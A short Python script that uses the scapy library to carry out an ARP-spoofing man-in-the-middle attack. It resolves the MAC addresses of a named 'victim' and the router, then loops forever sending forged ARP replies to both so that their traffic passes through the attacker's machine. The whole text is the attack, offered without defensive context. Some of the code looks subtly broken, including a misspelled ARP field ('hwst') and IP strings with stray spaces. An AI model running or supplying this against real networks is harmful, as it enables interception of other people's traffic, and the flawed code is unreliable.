import scapy.all as scapy

# ip of the router
gateway_ip ="192.168.0.1 "
# the ip of victim
target_ip =" 192.168.0.174"

# spoof_ip(addres of gateway) - if the victim will go to internet, he wouldnt go to internet,however he will go to my ip_adrr
def spoof(target_ip, target_mac, spoof_ip):
    spoofed_arp_packed = scapy.ARP(pdst=target_ip, hwst=target_mac, psrc=spoof_ip, op="is-at") # we are bilding the ARP packet
    scapy.send(spoofed_arp_packed, verbose=0)

#function that finds the MAC addresses for the IP (in local network)
def get_mac(ip):
    #--> we want to send request in the local network so we need broadcast(dst="ff:ff:ff:ff:ff:ff)
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip) # with "/" we connect arp packetes
    # srp- send and receive packet
    reply, smth = scapy.srp(arp_request,timeout= 3,verbose= 0) # verbose =0 - it willnot print all the messages on the way
    if reply: # != None
        # if there is answer we return the mac address
        return reply[0][1].src
    return None

def wait_untill_mac_found(ip):
    mac = None
    while not mac: # while target_mac ==None
        mac = get_mac(ip)
        if not mac:
            print("MAC addresess for TARGET NOT found")
    return mac

target_mac= wait_untill_mac_found(target_ip)
gateway_mac = wait_untill_mac_found(gateway_ip)

while True:
    spoof(target_ip=target_ip, target_mac=target_mac,spoof_ip=gateway_ip) # I send the data to the victim(target_ip) as a router(gateway_ip)
    spoof(target_ip=gateway_ip, target_mac=gateway_mac,spoof_ip=target_ip)
    print("Hmh... someones MITM attack active!")